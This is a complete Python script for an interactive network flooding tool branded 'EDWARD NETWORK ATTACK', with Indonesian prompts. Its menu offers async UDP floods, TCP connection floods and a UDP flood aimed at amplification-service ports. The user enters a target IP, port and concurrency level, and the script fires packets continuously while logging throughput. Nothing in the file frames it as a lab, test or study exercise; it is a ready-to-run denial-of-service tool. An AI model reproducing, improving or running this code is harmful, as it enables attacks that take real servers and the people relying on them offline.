import asyncio
import socket
import random
import sys
import os
import time
from datetime import datetime

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = BLUE = ""
    class Style:
        BRIGHT = RESET_ALL = ""

class EdwardAttack:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 0
        self.concurrency = 500
        self.running = False
        self.packets_sent = 0
        self.start_time = None
        self.log_file = "edward_attack_log.txt"

    def clear(self):
        os.system("cls" if os.name == "nt" else "clear")

    def banner(self):
        self.clear()
        print(Fore.RED + Style.BRIGHT + r"""
███████╗██████╗ ██╗    ██╗ █████╗ ██████╗ ██████╗ 
██╔════╝██╔══██╗██║    ██║██╔══██╗██╔══██╗██╔══██╗
█████╗  ██║  ██║██║ █╗ ██║███████║██████╔╝██║  ██║
██╔══╝  ██║  ██║██║███╗██║██╔══██║██╔══██╗██║  ██║
███████╗██████╔╝╚███╔███╔╝██║  ██║██║  ██║██████╔╝
╚══════╝╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
        """ + Fore.CYAN + "            EDWARD NETWORK ATTACK" + Style.RESET_ALL)
        print(Fore.YELLOW + "─" * 60)
        print(Fore.WHITE + "    High-Performance Async Flood (UDP / TCP SYN / Amplification)")
        print(Fore.YELLOW + "─" * 60 + "\n")

    def log(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(log_entry + "\n")
        print(Fore.GREEN + log_entry)

    async def async_udp_flood(self):
        loop = asyncio.get_running_loop()
        transport, protocol = await loop.create_datagram_endpoint(
            lambda: asyncio.DatagramProtocol(),
            remote_addr=(self.target_ip, self.target_port if self.target_port != 0 else random.randint(1, 65535))
        )
        payload = random._urandom(1472)
        while self.running:
            try:
                port = random.randint(1, 65535) if self.target_port == 0 else self.target_port
                transport.sendto(payload, (self.target_ip, port))
                self.packets_sent += 1
            except Exception:
                pass
            await asyncio.sleep(0)
        transport.close()

    async def async_tcp_syn_flood(self):
        while self.running:
            try:
                reader, writer = await asyncio.open_connection(self.target_ip, self.target_port if self.target_port != 0 else 80)
                writer.close()
                await writer.wait_closed()
                self.packets_sent += 1
            except Exception:
                pass
            await asyncio.sleep(0)

    async def async_ampl_flood(self):
        ampl_ports = [53, 123, 161, 389, 1900, 11211]
        payloads = [
            b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00",
            random._urandom(512),
            random._urandom(1400)
        ]
        loop = asyncio.get_running_loop()
        transport, protocol = await loop.create_datagram_endpoint(
            lambda: asyncio.DatagramProtocol(),
            remote_addr=(self.target_ip, random.choice(ampl_ports))
        )
        while self.running:
            try:
                payload = random.choice(payloads)
                port = random.choice(ampl_ports) if self.target_port == 0 else self.target_port
                transport.sendto(payload, (self.target_ip, port))
                self.packets_sent += 1
            except Exception:
                pass
            await asyncio.sleep(0)
        transport.close()

    async def status_monitor(self):
        while self.running:
            elapsed = time.time() - self.start_time
            pps = self.packets_sent / elapsed if elapsed > 0 else 0
            mbps = (self.packets_sent * 1400 * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
            print(Fore.MAGENTA + f"\r[STATUS] Paket: {self.packets_sent:,} | Waktu: {elapsed:.1f}s | Kecepatan: {pps:,.0f} pps | ~{mbps:.1f} Mbps   ", end="")
            sys.stdout.flush()
            await asyncio.sleep(0.4)

    async def main_worker(self, mode):
        self.running = True
        self.packets_sent = 0
        self.start_time = time.time()

        tasks = []
        for _ in range(self.concurrency):
            if mode == "UDP":
                tasks.append(asyncio.create_task(self.async_udp_flood()))
            elif mode == "TCP":
                tasks.append(asyncio.create_task(self.async_tcp_syn_flood()))
            elif mode == "AMPL":
                tasks.append(asyncio.create_task(self.async_ampl_flood()))

        tasks.append(asyncio.create_task(self.status_monitor()))

        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass

    def start_attack(self, mode):
        self.clear()
        print(Fore.RED + Style.BRIGHT + "\n[ SERANGAN ASYNC BERJALAN ]\n")
        self.log(f"Serangan dimulai → Target: {self.target_ip} | Mode: {mode} | Concurrency: {self.concurrency}")

        try:
            asyncio.run(self.main_worker(mode))
        except KeyboardInterrupt:
            self.stop_attack()

    def stop_attack(self):
        self.running = False
        elapsed = time.time() - self.start_time if self.start_time else 0
        self.clear()
        self.log(f"Serangan dihentikan | Total paket: {self.packets_sent:,} | Durasi: {elapsed:.2f} detik")
        print(Fore.RED + "\n[!] Serangan berhasil dihentikan.")
        print(Fore.CYAN + f"[*] Log disimpan di: {self.log_file}\n")

    def menu(self):
        while True:
            self.banner()
            print(Fore.CYAN + "[1] Async UDP Flood")
            print(Fore.CYAN + "[2] Async TCP Connection/SYN Flood")
            print(Fore.CYAN + "[3] Async Amplification UDP")
            print(Fore.CYAN + "[4] Keluar")
            print()

            choice = input(Fore.YELLOW + "Pilih jenis serangan (1-4): " + Fore.WHITE).strip()

            if choice == "4":
                self.clear()
                print(Fore.RED + "Keluar dari program...")
                sys.exit(0)

            if choice not in ["1", "2", "3"]:
                continue

            self.target_ip = input(Fore.YELLOW + "Masukkan IP target: " + Fore.WHITE).strip()

            if not self.target_ip:
                print(Fore.RED + "\n[!] IP target wajib diisi.")
                time.sleep(1.5)
                continue

            port_input = input(Fore.YELLOW + "Masukkan port (0 untuk acak/default): " + Fore.WHITE).strip()
            self.target_port = int(port_input) if port_input.isdigit() else 0

            concurrency_input = input(Fore.YELLOW + "Jumlah concurrency/tasks (disarankan 500-2000): " + Fore.WHITE).strip()
            self.concurrency = int(concurrency_input) if concurrency_input.isdigit() else 500

            print()
            print(Fore.RED + Style.BRIGHT + "Perhatian: Serangan berjalan asinkronus tanpa batas thread block.")
            input(Fore.YELLOW + "Tekan ENTER untuk memulai..." + Style.RESET_ALL)

            mode_map = {"1": "UDP", "2": "TCP", "3": "AMPL"}
            mode = mode_map.get(choice, "UDP")

            try:
                self.start_attack(mode)
            except KeyboardInterrupt:
                self.stop_attack()

if __name__ == "__main__":
    tool = EdwardAttack()
    tool.menu()
